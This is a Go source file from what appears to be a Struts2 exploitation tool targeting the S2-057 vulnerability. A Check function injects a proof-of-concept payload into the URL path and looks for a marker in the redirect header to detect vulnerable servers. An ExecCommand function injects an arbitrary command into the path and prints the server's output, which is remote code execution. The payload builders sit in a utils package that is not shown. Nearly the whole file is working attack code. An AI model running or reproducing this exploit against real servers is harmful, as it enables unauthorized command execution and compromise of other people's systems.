package s057

import (
	"ST2G/cvemod/utils"
	"fmt"
	"log"
	"strings"
)

func Check(targetUrl string) {
	actionIndex := strings.LastIndexAny(targetUrl, "/")
	targetUrl = targetUrl[:actionIndex] + utils.PocS057Check + targetUrl[actionIndex:]
	//_ = utils.GetFunc4Struts2(targetUrl,"","")
	headerLocation := utils.Get302Location(targetUrl)
	if utils.IfContainsStr(headerLocation, "6308") {
		log.Printf("%v %v", utils.Green(targetUrl), utils.Red("*Found Struts2-057！"))
	} else {
		log.Printf("%s Struts2-057 Not Vulnerable.", utils.Green(targetUrl))
	}
}

func ExecCommand(targetUrl string, command string) {
	actionIndex := strings.LastIndexAny(targetUrl, "/")
	targetUrl = targetUrl[:actionIndex] + utils.PocS057Exec(command) + targetUrl[actionIndex:]
	respString := utils.GetFunc4Struts2(targetUrl, "", "")
	fmt.Println(respString)
}
